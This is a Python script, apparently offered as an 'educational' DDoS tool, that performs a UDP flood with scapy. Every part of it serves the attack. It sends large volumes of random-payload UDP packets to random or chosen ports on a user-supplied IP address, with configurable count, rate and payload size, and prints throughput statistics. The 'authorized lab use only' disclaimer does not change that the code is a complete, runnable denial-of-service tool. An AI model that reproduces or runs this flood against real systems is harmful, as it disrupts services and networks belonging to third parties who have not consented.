#!/usr/bin/env python3
"""
UDP Flood Attack Tool — Educational / Lab Use Only

Sends a high volume of UDP datagrams to random ports on the target.
The target must check each port for a listening application and respond
with ICMP "Destination Unreachable" — consuming bandwidth and CPU.

How it works:
  1. Sends UDP packets with random payload to random ports
  2. Target processes each packet at the kernel level
  3. No application listening → ICMP port unreachable is generated
  4. Bandwidth saturated in both directions

Usage:
  sudo python3 udp_flood.py <target_ip> [options]

Requires: scapy, root/sudo privileges
"""

import argparse
import os
import random
import signal
import sys
import time

signal.signal(signal.SIGINT, lambda *_: (print("\nStopped."), sys.exit(0)))


def udp_flood(target_ip: str, target_port: int, count: int, rate: int, size: int):
    """Send UDP flood packets to the target."""
    try:
        from scapy.all import IP, UDP, Raw, send, RandShort  # type: ignore
    except ImportError:
        print("Error: scapy not installed. Run: pip install scapy")
        sys.exit(1)

    print(f"[UDP FLOOD] Target: {target_ip}:{target_port if target_port else 'random'}")
    print(f"[UDP FLOOD] Packets: {count}, Rate: {rate}/sec, Payload: {size} bytes")
    print("[UDP FLOOD] Press Ctrl+C to stop\n")

    sent = 0
    start = time.time()
    delay = 1.0 / rate if rate > 0 else 0

    for i in range(count):
        dst_port = target_port if target_port else random.randint(1, 65535)
        payload = os.urandom(size)

        pkt = IP(dst=target_ip) / UDP(
            sport=random.randint(1024, 65535),
            dport=dst_port,
        ) / Raw(load=payload)

        send(pkt, verbose=False)
        sent += 1

        if sent % 100 == 0:
            elapsed = time.time() - start
            pps = sent / elapsed if elapsed > 0 else 0
            mbps = (sent * size * 8) / (elapsed * 1_000_000) if elapsed > 0 else 0
            print(f"  Sent {sent}/{count} packets ({pps:.0f} pps, {mbps:.1f} Mbps)")

        if delay > 0:
            time.sleep(delay)

    elapsed = time.time() - start
    print(f"\n[DONE] Sent {sent} UDP packets in {elapsed:.1f}s ({sent / elapsed:.0f} pps)")


def main():
    parser = argparse.ArgumentParser(
        description="UDP Flood — Educational DDoS Testing Tool",
        epilog="⚠️  FOR AUTHORIZED LAB/EDUCATIONAL USE ONLY",
    )
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=0, help="Target port (0 = random, default: 0)")
    parser.add_argument("-c", "--count", type=int, default=10000, help="Number of packets (default: 10000)")
    parser.add_argument("-r", "--rate", type=int, default=500, help="Packets per second (default: 500)")
    parser.add_argument("-s", "--size", type=int, default=1024, help="Payload size in bytes (default: 1024)")

    args = parser.parse_args()
    udp_flood(args.target, args.port, args.count, args.rate, args.size)


if __name__ == "__main__":
    main()
